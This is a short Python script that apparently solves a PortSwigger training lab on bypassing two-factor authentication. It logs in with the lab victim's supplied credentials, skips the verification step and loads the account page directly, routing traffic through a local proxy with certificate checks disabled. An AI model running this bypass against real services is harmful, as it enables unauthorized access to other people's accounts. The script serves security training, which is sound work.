import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def print_lab_info(url):
    info = f"""
+{'='*70}+

 PortSwigger Lab: Authentication vulnerabilities
 Challenge: 2FA simple bypass
 Target: {url}

 Lab Description:
  This lab's two-factor authentication can be bypassed.
  You have already obtained a valid username and password,
  but do not have access to the user's 2FA verification code.
  To solve the lab, access Carlos's account page.

 Your credentials:
  - wiener : peter

 Victim's credentials:
  - carlos : montoya

+{'='*70}+
"""
    print(info)
    
def exploit_2fa_simple_bypass(url) :
    session = requests.session()
    
    login_url = url + "/login"
    login_data = {"username" : "carlos", "password" : "montoya"}
    
    # login
    session.post(login_url, data=login_data, allow_redirects=False, verify=False, proxies=proxies)
    # mypage
    mypage_url = url + "/my-account"
    response = session.get(mypage_url, verify=False, proxies=proxies)
    
    if "Log out" in response.text:
        print("[🎉] Exploit Success")
    else :
        print("[🧨] Exploit Failed")

    
def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print_lab_info(url)
    exploit_2fa_simple_bypass(url)
    
if __name__ == "__main__":
    main()